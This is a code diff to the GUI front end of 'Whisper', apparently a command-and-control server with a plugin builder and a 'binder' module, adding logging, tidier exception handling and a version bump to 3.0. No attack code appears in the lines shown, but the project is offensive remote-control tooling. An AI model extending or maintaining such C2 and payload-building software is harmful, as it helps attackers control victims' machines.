@@ -1,14 +1,16 @@
 """Whisper - Unified C2 Server & Plugin Builder"""
 import tkinter as tk
 from tkinter import ttk, scrolledtext, filedialog, messagebox
-import threading, os, sys, json, base64, webbrowser, subprocess, time, datetime
+import threading, os, sys, json, base64, webbrowser, subprocess, time, datetime, logging
 
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 from server import MainApp as ServerApp, setup_styles, DARK_BG, DARKER_BG, DARKEST_BG, ACCENT, TEXT_FG, TEXT_SEC, GREEN, FONT, FONT_BOLD, FONT_SM
 from builder import BuilderApp
+from whisper_logging import setup_logger
 import binder, web_server
 
-VERSION = "2.0"
+log = logging.getLogger("whisper.unified")
+VERSION = "3.0"
 
 class UnifiedApp:
     def __init__(self):
@@ -34,12 +36,15 @@ class UnifiedApp:
         self.root.after(500, self.server_tab._start_server)
 
     def _on_close(self):
-        try: self.server_tab.engine.stop()
-        except: pass
+        try:
+            self.server_tab.engine.stop()
+        except Exception as e:
+            log.debug("Error stopping server: %s", e)
         try:
             if self._web_server:
                 self._web_server.shutdown()
-        except: pass
+        except Exception as e:
+            log.debug("Error stopping web server: %s", e)
         self.root.destroy()
 
     def _make_tab(self, title):
@@ -130,7 +135,8 @@ class UnifiedApp:
             if self._web_server:
                 self._web_server.shutdown()
                 self._web_server = None
-        except: pass
+        except Exception as e:
+            log.debug("Error stopping web: %s", e)
         self.web_status.config(text="Stopped", fg=ACCENT)
         self.web_url_label.config(text="")
         self._web_log_msg("[*] Web server stopped")
